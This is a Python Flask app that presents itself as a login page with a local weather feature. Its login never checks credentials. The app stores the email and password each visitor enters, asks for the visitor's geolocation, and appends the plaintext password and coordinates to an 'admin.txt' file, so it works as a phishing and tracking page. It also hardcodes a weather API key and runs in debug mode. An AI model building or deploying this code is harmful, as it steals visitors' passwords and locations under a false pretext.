import os
import secrets
from datetime import datetime

import requests
from dotenv import load_dotenv
from flask import Flask, jsonify, redirect, render_template, request, session, url_for

load_dotenv()

app = Flask(__name__)
app.secret_key = os.getenv("SECRET_KEY", secrets.token_hex(32))

ADMIN_FILE = "admin.txt"
WEATHER_API_KEY = "35dasdasaa1dd6608928661a161651165"


@app.route("/")
def index():
    if "user" in session:
        return redirect(url_for("hello"))
    return render_template("login.html")


@app.route("/login", methods=["POST"])
def login():
    email = request.form.get("email", "").strip()
    password = request.form.get("password", "").strip()

    if not email or not password:
        return render_template(
            "login.html", error="Iltimos, email va parolni kiriting."
        )

    session["pending_email"] = email
    session["pending_password"] = password
    return redirect(url_for("location"))


@app.route("/location")
def location():
    if "pending_email" not in session or "pending_password" not in session:
        return redirect(url_for("index"))
    return render_template("location.html")


@app.route("/location", methods=["POST"])
def save_location():
    if "pending_email" not in session or "pending_password" not in session:
        return jsonify({"error": "Session expired"}), 400

    data = request.get_json()
    lat = data.get("lat")
    lng = data.get("lng")

    email = session.pop("pending_email", None)
    password = session.pop("pending_password", None)

    with open(ADMIN_FILE, "a", encoding="utf-8") as f:
        f.write(
            f"[{datetime.now()}] Email: {email} | Parol: {password} | Lokatsiya: {lat},{lng}\n"
        )

    session["user"] = {"email": email}
    session["lat"] = lat
    session["lng"] = lng
    return jsonify({"ok": True})


@app.route("/hello")
def hello():
    if "user" not in session:
        return redirect(url_for("index"))
    lat = session.get("lat")
    lng = session.get("lng")
    return render_template("hello.html", lat=lat, lng=lng)


@app.route("/weather")
def weather():
    lat = request.args.get("lat")
    lng = request.args.get("lng")
    if not lat or not lng:
        return jsonify({"error": "lat and lng required"}), 400
    try:
        resp = requests.get(
            "https://api.openweathermap.org/data/2.5/weather",
            params={
                "lat": lat,
                "lon": lng,
                "appid": WEATHER_API_KEY,
                "units": "metric",
                "lang": "uz",
            },
            timeout=10,
        )
        data = resp.json()
        if resp.status_code != 200:
            return jsonify(
                {"error": data.get("message", "API error")}
            ), resp.status_code
        return jsonify(data)
    except Exception as e:
        return jsonify({"error": str(e)}), 500


if __name__ == "__main__":
    app.run(debug=True, port=5000)
